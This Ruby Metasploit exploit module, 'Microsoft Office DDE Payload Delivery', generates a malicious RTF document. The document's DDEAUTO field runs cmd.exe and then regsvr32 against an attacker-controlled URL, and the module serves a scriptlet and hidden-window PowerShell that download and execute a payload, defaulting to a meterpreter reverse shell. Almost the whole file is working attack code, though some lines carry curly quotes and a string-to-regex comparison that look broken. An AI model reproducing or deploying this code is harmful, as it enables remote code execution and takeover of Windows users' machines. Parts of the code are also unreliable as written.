##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
    
class MetasploitModule  < Msf::Exploit::Remote
  Rank = ManualRanking
      
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE
      
  def initialize(info  = {})
    super(update_info(info, 
      'Name' => 'Microsoft Office DDE Payload Delivery',
      'Description' => %q{
        This module generates an DDE command to place within
        a word document, that when executed, will retrieve a HTA payload
        via HTTP from an web server.
      },
      'Author' => 'mumbai',
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'Oct 9 2017',
      'References' => [
        ['URL', 'https://gist.github.com/xillwillx/171c24c8e23512a891910824f506f563'],
        ['URL', 'https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/']
      ],
      'Arch' => [ARCH_X86, ARCH_X64],
      'Platform' => 'win',
      'Stance' => Msf::Exploit::Stance::Aggressive,
      'Targets' => [
        ['Microsoft Office', {} ],
      ],
      'DefaultTarget' => 0,
      'Payload' => {
        'DisableNops' => true
      },
      'DefaultOptions' => {
        'DisablePayloadHandler' => false,
        'PAYLOAD' => 'windows/meterpreter/reverse_tcp',
        'EXITFUNC' => 'thread'
      }
    ))

    register_options([
      OptString.new("FILENAME", [true, "Filename to save as", "msf.rtf"]),
      OptPath.new(“INJECT_PATH”, [false, "Path to file to inject", nil])
    ])
  end


  def gen_psh(url, *method)
    ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl
    if method.include? 'string'
      download_string = datastore['PSH-Proxy'] ? (Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(url)) : (Rex::Powershell::PshMethods.download_and_exec_string(url))
    else
    # Random filename to use, if there isn’t anything set
    random = "#{rand_text_alphanumeric 8}.exe"
    # Set filename (Use random filename if empty)
    filename = datastore['BinaryEXE-FILENAME'].blank? ? random : datastore['BinaryEXE-FILENAME']
    # Set path (Use %TEMP% if empty)
    path = datastore['BinaryEXE-PATH'].blank? ? "$env:temp" : %Q('#{datastore['BinaryEXE-PATH']}')
    # Join Path and Filename
    file = %Q(echo (#{path}+'\\#{filename}'))
    # Generate download PowerShell command
    download_string = Rex::Powershell::PshMethods.download_run(url, file)
    end

    download_and_run = "#{ignore_cert}#{download_string}"
    # Generate main PowerShell command
    return generate_psh_command_line(noprofile: true, windowstyle: 'hidden', command: download_and_run)
  end


  def on_request_uri(cli, _request)
    if _request.raw_uri == /\.sct$/
      print_status("Handling request for .sct from #{cli.peerhost}")
      payload = gen_psh("#{get_uri}", "string")
      data = gen_sct_file(payload)
      send_response(cli, data, 'Content-Type' => 'text/plain')
    else
      print_status("Delivering payload to #{cli.peerhost}…")
      p = regenerate_payload(cli)
      data = cmd_psh_payload(p.encoded,
        payload_instance.arch.first,
        remove_comspec: true,
        exec_in_place: true
      )
      send_response(cli, data, ‘Content-Type’ => ‘application/octet-stream’)
    end
  end

  
  def rand_class_id
    "#{Rex::Text.rand_text_hex 8}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 12}"
  end

    
  def gen_sct_file(command)
  # If the provided command is empty, a correctly formatted response is still needed (otherwise the system raises an error).
    if command == ''
      return %{<?XML version="1.0"?><scriptlet><registration progid="#{Rex::Text.rand_text_alphanumeric 8}" classid="{#{rand_class_id}}"></registration></scriptlet>}
    # If a command is provided, tell the target system to execute it.
    else
      return %{<?XML version="1.0"?><scriptlet><registration progid="#{Rex::Text.rand_text_alphanumeric 8}" classid="{#{rand_class_id}}"><script><![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("#{command}",0);]]></script></registration></scriptlet>}
    end
  end   

     
  def retrieve_header(filename)
    if (not datastore['INJECT_PATH'].nil?)
      path = "#{datastore['INJECT_PATH']}"
    else
      path = nil
    end
        
    if (not path.nil?)
      if ::File.file?(path)
        ::File.open(path, 'rb') do |fd|
        header = fd.read(fd.stat.size).split('{\*\datastore').first
        header = header.to_s
        print_status("Injecting #{path}…")
        return header
      end
      else
        header = '{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}' + "\n"
        header << '{\*\generator Riched20 6.3.9600}\viewkind4\uc1' + "\n"
        header << '\pard\sa200\sl276\slmult1\f0\fs22\lang9' + "\n"
      end
    else
      header = '{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}' + "\n"
      header << '{\*\generator Riched20 6.3.9600}\viewkind4\uc1' + "\n"
      header << '\pard\sa200\sl276\slmult1\f0\fs22\lang9' + "\n"
    end
    return header
  end

     
  def create_rtf
    header = retrieve_header(datastore['FILENAME'])
    field_class = '{\field{\*\fldinst {\rtlch\fcs1 \af31507 \ltrch\fcs0 \insrsid3807165  '
    field_class << "DDEAUTO C:\\\\\\\\Programs\\\\\\\\Microsoft\\\\\\\\Office\\\\\\\\MSword.exe\\\\\\\\..\\\\\\\\..\\\\\\\\..\\\\\\\\..\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe \"/c regsvr32 /s /n /u /i:#{get_uri}.sct scrobj.dll\" }}"
    field_class << '{\fldrslt }}\sectd \ltrsect\linex0\endnhere\sectlinegrid360\sectdefaultcl\sftnbj {\rtlch\fcs1 \af31507 \ltrch\fcs0' + "\n"
    field_class << '\insrsid5790315' + "\n"
    field_class << '\par }'
    footer =  '}}' 
    # footer
    rtf = header + field_class + footer
    rtf
  end

     

  def primer
    file_create(create_rtf)
  end
    
end
